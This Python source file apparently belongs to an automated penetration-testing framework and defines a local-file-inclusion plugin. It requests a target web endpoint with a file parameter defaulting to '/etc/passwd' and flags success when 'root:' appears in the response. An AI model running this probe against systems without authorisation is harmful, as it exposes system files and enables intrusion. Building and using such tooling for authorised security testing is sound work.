from __future__ import annotations

from typing import Any, Dict

import requests

from adaptive_pen_test.plugin_manager import BasePlugin


class LfiPlugin(BasePlugin):
    """Attempt local file inclusion or file read via a web endpoint."""

    async def run(self, params: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        endpoint = params.get("endpoint")
        file_path = params.get("file_path", "/etc/passwd")
        target_ip = context.get("target", {}).get("ip")
        url = f"http://{target_ip}{endpoint}" if target_ip else endpoint
        payload = {params.get("param", "file"): file_path}
        response = requests.get(url, params=payload, timeout=5)
        found = response.status_code == 200 and "root:" in response.text
        return {"url": url, "payload": payload, "status_code": response.status_code, "found": found, "snippet": response.text[:200]}
